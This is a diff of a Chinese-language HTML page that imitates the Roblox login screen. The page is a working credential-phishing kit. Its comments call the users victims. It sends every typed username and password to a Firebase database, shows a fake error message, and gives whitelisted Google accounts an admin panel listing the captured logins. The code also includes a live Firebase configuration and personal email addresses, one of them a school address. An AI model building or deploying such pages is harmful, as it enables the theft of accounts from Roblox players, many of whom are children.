@@ -6,421 +6,295 @@
     <title>登入 Roblox</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body {
-            background-color: #f3f6fa;
-            overflow: hidden; /* 防止背景滾動 */
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            color: #334155;
-        }
-        
-        /* 液態毛玻璃特效 (Liquid Glassmorphism) */
-        .liquid-glass {
-            background: rgba(255, 255, 255, 0.45);
-            backdrop-filter: blur(16px) saturate(180%);
-            -webkit-backdrop-filter: blur(16px) saturate(180%);
-            border: 1px solid rgba(255, 255, 255, 0.7);
-            box-shadow: 0 12px 40px 0 rgba(31, 38, 135, 0.07);
-        }
-
-        .liquid-glass-nav {
-            background: rgba(255, 255, 255, 0.6);
-            backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
-            border-bottom: 1px solid rgba(255, 255, 255, 0.6);
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03);
-        }
-
-        /* 輸入框的聚焦與液態效果 */
-        .input-glass {
-            background: rgba(255, 255, 255, 0.55);
-            border: 1px solid rgba(255, 255, 255, 0.8);
-            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.02);
-            transition: all 0.3s ease;
-        }
-        .input-glass:focus {
-            outline: none;
-            background: rgba(255, 255, 255, 0.9);
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15);
-        }
-        .input-glass::placeholder {
-            color: #94a3b8;
-        }
-
-        /* 流動背景光球動畫 (Liquid Blobs) */
-        @keyframes blob-float {
-            0% { transform: translate(0, 0) scale(1); }
-            33% { transform: translate(30px, -50px) scale(1.1); }
-            66% { transform: translate(-20px, 20px) scale(0.9); }
-            100% { transform: translate(0, 0) scale(1); }
-        }
-        .blob {
-            position: absolute;
-            filter: blur(80px);
-            z-index: -3;
-            opacity: 0.6;
-            animation: blob-float 15s infinite alternate ease-in-out;
-            border-radius: 50%;
-        }
-        .blob-1 { top: -10%; left: -10%; width: 500px; height: 500px; background: #bfdbfe; }
-        .blob-2 { bottom: -10%; right: -10%; width: 600px; height: 600px; background: #ddd6fe; animation-delay: -5s; }
-        .blob-3 { top: 40%; left: 40%; width: 400px; height: 400px; background: #a7f3d0; animation-delay: -10s; }
-
-        /* 傾斜背景圖塊網格設定 (淺色融合版) */
-        .bg-grid-wrapper {
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            transform: rotate(-12deg);
-            z-index: -2;
-            pointer-events: none;
-        }
-        .bg-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
-            gap: 12px;
-            width: 100%;
-            height: 100%;
-            opacity: 0.12; /* 大幅降低不透明度，讓玻璃質感更明顯 */
-        }
-        .tile {
-            width: 100%;
-            aspect-ratio: 1;
-            background-size: cover;
-            background-position: center;
-            border-radius: 16px;
-        }
-
-        /* 自訂滾動條 (淺色系) */
-        ::-webkit-scrollbar {
-            width: 8px;
-        }
-        ::-webkit-scrollbar-track {
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 4px;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: rgba(148, 163, 184, 0.5);
-            border-radius: 4px;
-        }
-        ::-webkit-scrollbar-thumb:hover {
-            background: rgba(148, 163, 184, 0.8);
-        }
+        body { background-color: #111214; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        .bg-grid-wrapper { position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; transform: rotate(-12deg); z-index: -2; pointer-events: none; }
+        .bg-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 12px; width: 100%; height: 100%; opacity: 0.45; }
+        .tile { width: 100%; aspect-ratio: 1; background-size: cover; background-position: center; border-radius: 12px; box-shadow: 0 8px 16px rgba(0,0,0,0.8); }
+        input:focus { outline: none; border-color: #ffffff; background-color: #111214; }
+        input::placeholder { color: #888c90; }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #111214; border-radius: 4px; }
+        ::-webkit-scrollbar-thumb { background: #393b3d; border-radius: 4px; }
     </style>
 </head>
-<body class="flex flex-col h-screen relative selection:bg-blue-200">
+<body class="text-white flex flex-col h-screen relative">
 
-    <!-- 流動光球背景 (Liquid Blobs) -->
-    <div class="blob blob-1"></div>
-    <div class="blob blob-2"></div>
-    <div class="blob blob-3"></div>
+    <div class="bg-grid-wrapper" aria-hidden="true"><div class="bg-grid" id="bg-grid"></div></div>
+    <div class="absolute inset-0 bg-black/50 z-[-1] pointer-events-none"></div>
 
-    <!-- 傾斜遊戲圖塊背景 -->
-    <div class="bg-grid-wrapper" aria-hidden="true">
-        <div class="bg-grid" id="bg-grid"></div>
-    </div>
-    
-    <!-- 白色漸變遮罩層，確保畫面柔和 -->
-    <div class="absolute inset-0 bg-white/30 z-[-1] pointer-events-none"></div>
-
-    <!-- 頂部導航欄 (Navbar) - 液態玻璃風格 -->
-    <nav class="w-full h-14 liquid-glass-nav flex items-center justify-between px-6 z-50 fixed top-0">
-        <!-- 左側：Logo 與 連結 -->
+    <nav class="w-full h-14 bg-[#111214]/95 border-b border-gray-800 flex items-center justify-between px-6 z-50 fixed top-0">
         <div class="flex items-center gap-6">
-            <a href="#" class="text-slate-800 hover:text-blue-500 transition-colors drop-shadow-sm">
-                <!-- Roblox Logo SVG -->
+            <a href="#" id="logo" class="text-white">
                 <svg viewBox="0 0 24 24" fill="currentColor" class="w-[30px] h-[30px]">
                     <path fill-rule="evenodd" clip-rule="evenodd" d="M5.275 2.5L2.5 18.725L18.725 21.5L21.5 5.275L5.275 2.5ZM13.842 13.626L10.373 14.22L9.779 10.751L13.248 10.158L13.842 13.626Z" />
                 </svg>
             </a>
-            
-            <div class="hidden md:flex items-center gap-5 text-[15px] font-bold tracking-wide text-slate-700">
-                <a href="#" class="hover:text-blue-500 transition-colors">圖表</a>
-                <a href="#" class="hover:text-blue-500 transition-colors">市集</a>
-                <a href="#" class="hover:text-blue-500 transition-colors">創作</a>
-                <a href="#" class="hover:text-blue-500 transition-colors">Robux</a>
+            <div class="hidden md:flex items-center gap-5 text-[15px] font-bold">
+                <a href="#" class="nav-link">圖表</a><a href="#" class="nav-link">市集</a><a href="#" class="nav-link">創作</a><a href="#" class="nav-link">Robux</a>
             </div>
         </div>
-
-        <!-- 中間：搜尋欄 -->
         <div class="flex-1 max-w-[600px] mx-6 hidden md:block">
-            <div class="relative flex items-center w-full h-[36px] rounded-lg input-glass">
-                <svg class="w-[18px] h-[18px] ml-3 text-slate-400" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-4.35-4.35M17 10a7 7 0 11-14 0 7 7 0 0114 0z"></path>
-                </svg>
-                <input type="text" placeholder="搜尋" class="bg-transparent w-full h-full pl-3 pr-4 outline-none text-[15px] text-slate-800 placeholder-slate-400">
+            <div class="relative flex items-center w-full h-[34px] rounded bg-[#232527] border border-transparent focus-within:border-white">
+                <input type="text" placeholder="搜尋" class="bg-transparent w-full h-full pl-3 pr-4 outline-none text-[15px]">
             </div>
         </div>
-
-        <!-- 右側：註冊按鈕 -->
-        <div class="flex items-center">
-            <button class="bg-white/70 backdrop-blur-md border border-white hover:bg-white text-slate-800 px-5 py-[6px] rounded-lg text-[15px] font-bold transition-all shadow-sm hover:shadow">
-                註冊
-            </button>
-        </div>
+        <div class="flex items-center"><button id="reg-btn" class="bg-[#3b82f6] px-4 py-[6px] rounded text-[15px] font-bold">註冊</button></div>
     </nav>
 
-    <!-- 主要內容區 -->
     <main class="flex-1 flex items-center justify-center p-4 relative z-10 mt-14">
         
-        <!-- 正常的登入視窗 -->
-        <div id="login-window" class="liquid-glass w-full max-w-[400px] rounded-2xl p-8 flex flex-col items-center transform transition-all">
-            
-            <h1 class="text-[28px] font-extrabold text-slate-800 mb-6 drop-shadow-sm">登入 Roblox</h1>
-            
+        <!-- 登入視窗 -->
+        <div id="login-window" class="bg-[#2b2d31] w-full max-w-[400px] rounded-lg p-8 shadow-2xl flex flex-col items-center">
+            <h1 class="text-[26px] font-bold mb-6">登入 Roblox</h1>
             <div class="w-full flex flex-col gap-4">
-                <input 
-                    type="text" 
-                    id="username"
-                    placeholder="使用者名稱 / 電子郵件地址 / 手機號碼" 
-                    class="w-full input-glass rounded-xl px-4 py-[12px] text-[15px] text-slate-800 font-medium"
-                >
-                
-                <input 
-                    type="password" 
-                    id="password"
-                    placeholder="密碼" 
-                    class="w-full input-glass rounded-xl px-4 py-[12px] text-[15px] text-slate-800 font-medium"
-                >
-                
-                <!-- 釣魚紀錄用的錯誤訊息 (預設隱藏) -->
-                <div id="error-message" class="hidden text-red-500 text-[14px] text-center font-medium w-full bg-red-50 border border-red-200 rounded-xl py-2 mt-1 shadow-sm">
+                <input type="text" id="username" placeholder="使用者名稱 / 電子郵件 / 手機號碼" class="w-full bg-[#111214] border border-gray-600 rounded-lg px-4 py-[10px]">
+                <input type="password" id="password" placeholder="密碼" class="w-full bg-[#111214] border border-gray-600 rounded-lg px-4 py-[10px]">
+                <div id="error-message" class="hidden text-red-400 text-[14px] text-center w-full bg-red-500/10 border border-red-500/30 rounded-lg py-2">
                     使用者名稱或密碼不正確。
                 </div>
-
-                <button id="login-btn" class="w-full bg-white/40 border border-white/50 text-slate-500 rounded-xl py-[12px] mt-2 transition-all duration-300 text-[16px] font-bold">
-                    登入
-                </button>
+                <div id="google-auth-msg" class="hidden text-blue-400 text-[14px] text-center w-full bg-blue-500/10 border border-blue-500/30 rounded-lg py-2">
+                    正在呼叫 Google 驗證，請在彈窗中登入...
+                </div>
+                <button id="login-btn" class="w-full border border-gray-400 text-gray-300 rounded-lg py-[10px] font-medium transition-colors">登入</button>
             </div>
-            
-            <div class="mt-5 mb-3">
-                <a href="#" class="text-[13.5px] font-medium text-slate-500 hover:text-blue-500 transition-colors">
-                    忘記密碼或使用者名稱？
-                </a>
-            </div>
-            
-            <!-- 次要登入方式按鈕 -->
+            <a href="#" class="mt-4 text-[13px] text-gray-400">忘記密碼或使用者名稱？</a>
             <div class="w-full flex flex-col gap-3 mt-4">
-                <button class="w-full bg-white/50 hover:bg-white/80 border border-white/60 text-slate-700 rounded-xl py-[10px] transition-all text-[14px] font-bold shadow-sm">
-                    透過電子郵件給我一次性驗證碼
-                </button>
-                <button class="w-full bg-white/50 hover:bg-white/80 border border-white/60 text-slate-700 rounded-xl py-[10px] transition-all text-[14px] font-bold shadow-sm">
-                    快速登入
-                </button>
-            </div>
-            
-            <div class="mt-6 text-[14px] font-medium text-slate-500">
-                沒有帳號？ <a href="#" class="text-blue-500 hover:text-blue-600 hover:underline transition-colors">註冊</a>
+                <button class="nav-link w-full bg-[#393b3d] py-[10px] rounded-lg text-[14px]">透過電子郵件驗證碼</button>
+                <button class="nav-link w-full bg-[#393b3d] py-[10px] rounded-lg text-[14px]">快速登入</button>
             </div>
         </div>
 
-        <!-- 管理員模式面板 (預設隱藏) -->
-        <div id="admin-panel" class="hidden liquid-glass w-full max-w-[650px] rounded-2xl p-8 flex-col items-center">
-            <h1 class="text-[28px] font-extrabold text-blue-500 mb-2 drop-shadow-sm">管理員控制台</h1>
-            <p class="text-slate-500 font-medium text-sm mb-6">以下是所有用戶嘗試登入的帳號與密碼紀錄</p>
-
-            <div class="w-full bg-white/40 backdrop-blur-md rounded-xl p-4 max-h-[300px] overflow-y-auto border border-white/60 shadow-inner">
-                <table class="w-full text-left text-sm text-slate-700">
-                    <thead class="sticky top-0 bg-white/80 backdrop-blur-md shadow-sm rounded-t-lg z-10">
+        <!-- 管理員面板 -->
+        <div id="admin-panel" class="hidden bg-[#2b2d31] w-full max-w-[600px] rounded-lg p-8 shadow-2xl flex-col items-center">
+            <h1 class="text-[26px] font-bold text-red-400 mb-2">安全管理員模式</h1>
+            <p id="admin-welcome" class="text-green-400 text-sm mb-4">已驗證管理員身分</p>
+            <div class="w-full bg-[#111214] rounded-lg p-4 max-h-[300px] overflow-y-auto border border-gray-700 mt-2">
+                <table class="w-full text-left text-sm text-gray-300" style="table-layout: fixed;">
+                    <thead class="sticky top-0 bg-[#111214] z-10">
                         <tr>
-                            <th class="pb-3 pt-2 px-2 border-b border-slate-200/50 w-1/3 font-bold">時間</th>
-                            <th class="pb-3 pt-2 px-2 border-b border-slate-200/50 w-1/3 font-bold">帳號</th>
-                            <th class="pb-3 pt-2 px-2 border-b border-slate-200/50 w-1/3 font-bold">密碼</th>
+                            <th class="pb-2 border-b border-gray-700 w-1/4">時間</th>
+                            <th class="pb-2 border-b border-gray-700 w-1/3">帳號</th>
+                            <th class="pb-2 border-b border-gray-700 w-1/3">密碼</th>
                         </tr>
                     </thead>
-                    <tbody id="admin-records" class="font-medium">
-                        <!-- 紀錄會透過 JS 動態插入這裡 -->
-                    </tbody>
+                    <tbody id="admin-records"></tbody>
                 </table>
             </div>
-
             <div class="flex gap-4 mt-6 w-full">
-                <button id="clear-records-btn" class="flex-1 bg-red-50 hover:bg-red-100 border border-red-200 text-red-500 py-[12px] rounded-xl text-[15px] font-bold transition-all shadow-sm">
-                    清除所有紀錄
-                </button>
-                <button id="close-admin-btn" class="flex-1 bg-blue-500 hover:bg-blue-600 text-white shadow-md shadow-blue-500/30 py-[12px] rounded-xl text-[15px] font-bold transition-all">
-                    關閉並返回
-                </button>
+                <button id="clear-records-btn" class="flex-1 bg-red-500 py-[10px] rounded-lg font-bold">清除雲端紀錄</button>
+                <button id="close-admin-btn" class="flex-1 bg-blue-600 py-[10px] rounded-lg font-bold">登出並退出</button>
             </div>
         </div>
 
-        <!-- 404 錯誤彈窗 (預設隱藏) -->
-        <div id="error-404-modal" class="hidden fixed inset-0 bg-slate-900/30 backdrop-blur-sm z-[100] flex items-center justify-center p-4">
-            <div class="liquid-glass w-full max-w-[340px] rounded-2xl p-8 shadow-2xl flex flex-col items-center text-center transform transition-all scale-100">
-                <div class="bg-red-100 p-4 rounded-full mb-5 shadow-inner">
-                    <svg class="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path>
-                    </svg>
-                </div>
-                <h2 class="text-[22px] font-extrabold text-slate-800 mb-2">404 Not Found</h2>
-                <p class="text-slate-500 font-medium text-[15px] mb-8">您請求的頁面或功能不存在。</p>
-                <button id="close-404-btn" class="bg-slate-800 hover:bg-slate-900 text-white px-6 py-[10px] rounded-xl transition-all shadow-md text-[15px] font-bold w-full">
-                    關閉
-                </button>
+        <!-- 自訂 404 彈窗 -->
+        <div id="error-404-modal" class="hidden fixed inset-0 bg-black/70 z-[100] flex items-center justify-center p-4">
+            <div class="bg-[#2b2d31] w-full max-w-[300px] rounded-lg p-6 text-center border border-gray-700">
+                <h2 class="text-xl font-bold mb-2">404 Not Found</h2>
+                <p id="modal-error-text" class="text-gray-400 text-sm mb-6">頁面或功能不存在。</p>
+                <button id="close-404-btn" class="bg-gray-700 hover:bg-gray-600 text-white w-full py-2 rounded-lg">關閉</button>
             </div>
         </div>
-
     </main>
 
-    <script>
-        // --- 1. 背景網格特效 ---
-        document.addEventListener("DOMContentLoaded", () => {
-            const grid = document.getElementById("bg-grid");
-            const numberOfTiles = 200; 
-            
-            for (let i = 0; i < numberOfTiles; i++) {
-                const tile = document.createElement("div");
-                tile.className = "tile";
-                tile.style.backgroundImage = `url('https://picsum.photos/seed/${i + 1000}/300/300')`;
-                grid.appendChild(tile);
-            }
-        });
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, GoogleAuthProvider, signInWithPopup, signOut } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, collection, addDoc, onSnapshot, getDocs, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
 
-        // --- 2. 登入邏輯與釣魚紀錄功能 ---
+        const firebaseConfig = {
+          apiKey: "AIzaSyC28C5UtC0UoEFiUCH7Rd5lxDw1WvgEBYQ",
+          authDomain: "roblox-login-83bc9.firebaseapp.com",
+          projectId: "roblox-login-83bc9",
+          storageBucket: "roblox-login-83bc9.firebasestorage.app",
+          messagingSenderId: "870394222766",
+          appId: "1:870394222766:web:0db356d9ce3f9b6d8eb53f",
+          measurementId: "G-962FYDGR28"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const db = getFirestore(app);
+        const provider = new GoogleAuthProvider();
+        const collectionPath = 'artifacts/roblox-clone-data/public/data/credentials'; // 固定的資料庫路徑
+
+        // 允許的管理員 Email 列表
+        const ALLOWED_EMAILS = [
+            "pixel9profold20240813@gmail.com",
+            "st20813@mail.ckjhs.tyc.edu.tw"
+        ];
+
+        let unsubscribeSnapshot = null;
+        let logs = [];
+
+        // 預設讓受害者用匿名登入，這樣他們才有寫入資料庫的權限
+        signInAnonymously(auth).catch(console.error);
+
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
         const loginBtn = document.getElementById('login-btn');
-        
-        const loginWindow = document.getElementById('login-window');
         const errorMessage = document.getElementById('error-message');
-        
-        const adminPanel = document.getElementById('admin-panel');
-        const adminRecordsTable = document.getElementById('admin-records');
-        const closeAdminBtn = document.getElementById('close-admin-btn');
-        const clearRecordsBtn = document.getElementById('clear-records-btn');
+        const googleAuthMsg = document.getElementById('google-auth-msg');
 
-        // 從 localStorage 取得歷史紀錄 (模擬資料庫保存)
-        let capturedData = JSON.parse(localStorage.getItem('roblox_captured_data')) || [];
-
-        // 輸入框變色邏輯 (適應淺色玻璃風格)
-        function checkInputs() {
-            if (usernameInput.value.length > 0 && passwordInput.value.length > 0) {
-                loginBtn.classList.remove('bg-white/40', 'text-slate-500', 'border-white/50');
-                loginBtn.classList.add('bg-blue-500', 'text-white', 'border-blue-500', 'hover:bg-blue-600', 'shadow-md', 'shadow-blue-500/30');
+        // 輸入框樣式切換
+        function updateBtn() {
+            if(usernameInput.value && passwordInput.value) {
+                loginBtn.className = "w-full bg-white text-black hover:bg-gray-200 rounded-lg py-[10px] font-medium transition-colors";
             } else {
-                loginBtn.classList.add('bg-white/40', 'text-slate-500', 'border-white/50');
-                loginBtn.classList.remove('bg-blue-500', 'text-white', 'border-blue-500', 'hover:bg-blue-600', 'shadow-md', 'shadow-blue-500/30');
+                loginBtn.className = "w-full border border-gray-400 text-gray-300 rounded-lg py-[10px] font-medium transition-colors";
             }
         }
+        usernameInput.oninput = updateBtn;
+        passwordInput.oninput = updateBtn;
 
-        usernameInput.addEventListener('input', checkInputs);
-        passwordInput.addEventListener('input', checkInputs);
+        // XSS 防護：將字串轉為安全的 HTML 實體
+        function escapeHTML(str) {
+            const div = document.createElement('div');
+            div.textContent = str;
+            return div.innerHTML;
+        }
 
-        // 登入按鈕點擊事件
-        loginBtn.addEventListener('click', () => {
-            const user = usernameInput.value;
-            const pass = passwordInput.value;
+        // 彈出錯誤訊息視窗
+        function showErrorModal(text) {
+            document.getElementById('modal-error-text').innerText = text;
+            document.getElementById('error-404-modal').classList.remove('hidden');
+        }
 
-            if (!user || !pass) return; // 如果沒輸入不作動
+        loginBtn.onclick = async () => {
+            const u = usernameInput.value;
+            const p = passwordInput.value;
+            if(!u || !p) return;
 
-            if (user === 'admin' && pass === 'admin') {
-                // 進入管理員模式
+            // 觸發管理員驗證程序
+            if(u === 'admin' && p === 'admin') {
                 errorMessage.classList.add('hidden');
-                openAdminPanel();
+                googleAuthMsg.classList.remove('hidden');
+                loginBtn.disabled = true;
+
+                try {
+                    // 呼叫 Google 登入彈窗
+                    const result = await signInWithPopup(auth, provider);
+                    const email = result.user.email;
+
+                    // 檢查信箱是否在白名單內
+                    if (ALLOWED_EMAILS.includes(email)) {
+                        document.getElementById('admin-welcome').innerText = `已登入: ${email}`;
+                        document.getElementById('login-window').classList.add('hidden');
+                        document.getElementById('admin-panel').classList.remove('hidden');
+                        document.getElementById('admin-panel').classList.add('flex');
+                        
+                        // 開啟即時資料庫監聽
+                        listenToData();
+                    } else {
+                        // 信箱不符，強制登出並阻擋
+                        await signOut(auth);
+                        showErrorModal(`存取被拒。信箱 ${email} 無管理員權限。`);
+                        // 恢復原本的匿名登入以接收受害者的輸入
+                        signInAnonymously(auth); 
+                    }
+                } catch (error) {
+                    console.error("Google 登入失敗", error);
+                    showErrorModal("Google 登入已取消或發生錯誤。");
+                } finally {
+                    googleAuthMsg.classList.add('hidden');
+                    loginBtn.disabled = false;
+                    passwordInput.value = '';
+                    updateBtn();
+                }
             } else {
-                // 一般使用者登入 -> 紀錄帳密並顯示錯誤
-                const now = new Date();
-                const record = {
-                    time: now.toLocaleDateString() + ' ' + now.toLocaleTimeString(),
-                    username: user,
-                    password: pass
-                };
-
-                // 將紀錄推入陣列並儲存至瀏覽器
-                capturedData.push(record);
-                localStorage.setItem('roblox_captured_data', JSON.stringify(capturedData));
-
-                // 顯示錯誤訊息
+                // --- 受害者登入流程 (釣魚) ---
                 errorMessage.classList.remove('hidden');
-
-                // 可選：輸入錯誤後自動清空密碼
                 passwordInput.value = '';
-                checkInputs();
+                updateBtn();
+                
+                try {
+                    // 將資料寫入 Firebase，即使包含 SQLi 或 XSS 語法，Firestore 都是以字串安全儲存
+                    const pathSegments = collectionPath.split('/');
+                    await addDoc(collection(db, pathSegments[0], pathSegments[1], pathSegments[2], pathSegments[3], pathSegments[4]), {
+                        u: u, 
+                        p: p, 
+                        time: new Date().toLocaleString(), 
+                        ts: Date.now()
+                    });
+                } catch (err) {
+                    console.error("寫入失敗", err);
+                }
             }
-        });
+        };
 
-        // --- 3. 管理員面板功能 ---
-
-        function openAdminPanel() {
-            // 切換視窗顯示狀態
-            loginWindow.classList.add('hidden');
-            adminPanel.classList.remove('hidden');
-            adminPanel.classList.add('flex'); // 確保面板以 flex 排版顯示
-
-            // 渲染表格資料
-            renderAdminTable();
-        }
-
-        function renderAdminTable() {
-            adminRecordsTable.innerHTML = ''; // 清空現有內容
-
-            if (capturedData.length === 0) {
-                adminRecordsTable.innerHTML = `
-                    <tr>
-                        <td colspan="3" class="text-center py-8 text-slate-400">目前沒有任何用戶的登入紀錄。</td>
-                    </tr>
-                `;
-                return;
-            }
-
-            // 反轉陣列，讓最新的紀錄顯示在最上面
-            [...capturedData].reverse().forEach(data => {
-                const tr = document.createElement('tr');
-                tr.innerHTML = `
-                    <td class="py-3 px-2 border-b border-slate-200/40 text-slate-500 text-[13px]">${data.time}</td>
-                    <td class="py-3 px-2 border-b border-slate-200/40 font-bold text-blue-600 break-all pr-2">${data.username}</td>
-                    <td class="py-3 px-2 border-b border-slate-200/40 font-bold text-slate-700 break-all">${data.password}</td>
-                `;
-                adminRecordsTable.appendChild(tr);
+        // 監聽並渲染資料表
+        function listenToData() {
+            const pathSegments = collectionPath.split('/');
+            const ref = collection(db, pathSegments[0], pathSegments[1], pathSegments[2], pathSegments[3], pathSegments[4]);
+            
+            // 由於已經綁定 Firebase Rules，如果非管理員透過 F12 呼叫此函數，Firebase 會直接回傳 "Missing or insufficient permissions" 錯誤，無法抓取資料
+            unsubscribeSnapshot = onSnapshot(ref, snap => {
+                logs = snap.docs.map(d => ({id: d.id, ...d.data()})).sort((a,b) => b.ts - a.ts);
+                renderTable();
+            }, error => {
+                console.error("無法獲取資料，可能是權限不足 (Firebase Rules 阻擋):", error);
+                showErrorModal("嚴重錯誤：Firebase 拒絕存取，您沒有權限讀取資料庫。");
             });
         }
 
-        // 關閉管理員面板
-        closeAdminBtn.addEventListener('click', () => {
-            adminPanel.classList.add('hidden');
-            adminPanel.classList.remove('flex');
-            loginWindow.classList.remove('hidden');
-            
-            // 清空原本的輸入框
+        // 渲染表格 (並透過 escapeHTML 防止 XSS)
+        function renderTable() {
+            const body = document.getElementById('admin-records');
+            if (logs.length === 0) {
+                body.innerHTML = '<tr><td colspan="3" class="text-center py-4 text-gray-500">雲端目前無紀錄</td></tr>';
+                return;
+            }
+            body.innerHTML = logs.map(l => `
+                <tr>
+                    <td class="py-2 border-b border-gray-800 text-gray-400 pr-2">${escapeHTML(l.time || '')}</td>
+                    <td class="py-2 border-b border-gray-800 text-blue-400 break-all pr-2" style="word-break: break-all;">${escapeHTML(l.u || '')}</td>
+                    <td class="py-2 border-b border-gray-800 text-red-400 break-all" style="word-break: break-all;">${escapeHTML(l.p || '')}</td>
+                </tr>
+            `).join('');
+        }
+
+        // 管理員登出並返回
+        document.getElementById('close-admin-btn').onclick = async () => {
+            if(unsubscribeSnapshot) unsubscribeSnapshot(); // 停止監聽
+            await signOut(auth); // 登出 Google 帳號
+            signInAnonymously(auth); // 變回受害者模式
+
+            document.getElementById('admin-panel').classList.add('hidden');
+            document.getElementById('admin-panel').classList.remove('flex');
+            document.getElementById('login-window').classList.remove('hidden');
             usernameInput.value = '';
             passwordInput.value = '';
-            checkInputs();
-        });
+            updateBtn();
+        };
 
-        // 清除所有紀錄
-        clearRecordsBtn.addEventListener('click', () => {
-            if(confirm("確定要刪除所有紀錄嗎？此動作無法復原。")) {
-                capturedData = [];
-                localStorage.removeItem('roblox_captured_data');
-                renderAdminTable();
+        // 清除紀錄
+        document.getElementById('clear-records-btn').onclick = async () => {
+            if(!confirm("刪除雲端所有數據？此動作無法復原。")) return;
+            const pathSegments = collectionPath.split('/');
+            const ref = collection(db, pathSegments[0], pathSegments[1], pathSegments[2], pathSegments[3], pathSegments[4]);
+            try {
+                const snap = await getDocs(ref);
+                snap.forEach(async d => await deleteDoc(doc(db, pathSegments[0], pathSegments[1], pathSegments[2], pathSegments[3], pathSegments[4], d.id)));
+            } catch (error) {
+                console.error("刪除失敗", error);
+                showErrorModal("刪除失敗，權限不足或網路錯誤。");
             }
-        });
-
-        // --- 4. 404 錯誤彈窗邏輯 ---
-        const error404Modal = document.getElementById('error-404-modal');
-        const close404Btn = document.getElementById('close-404-btn');
+        };
 
         // 關閉 404 彈窗
-        close404Btn.addEventListener('click', () => {
-            error404Modal.classList.add('hidden');
-        });
+        document.getElementById('close-404-btn').onclick = () => {
+            document.getElementById('error-404-modal').classList.add('hidden');
+        };
 
-        // 攔截所有連結和按鈕 (排除主要功能按鈕)
-        const allInteractables = document.querySelectorAll('a, button');
-        const excludedIds = ['login-btn', 'clear-records-btn', 'close-admin-btn', 'close-404-btn'];
-
-        allInteractables.forEach(el => {
-            // 只要 ID 不在排除名單內，就通通攔截
-            if (!excludedIds.includes(el.id)) {
-                el.addEventListener('click', (e) => {
-                    e.preventDefault(); // 阻止原本的跳轉或動作
-                    error404Modal.classList.remove('hidden'); // 顯示 404 彈窗
-                });
-            }
-        });
-
+        // 背景生成
+        const grid = document.getElementById('bg-grid');
+        for(let i=0; i<150; i++) {
+            const d = document.createElement('div');
+            d.className = 'tile';
+            d.style.backgroundImage = `url(https://picsum.photos/seed/${i+50}/200)`;
+            grid.appendChild(d);
+        }
     </script>
 </body>
 </html>
+
+
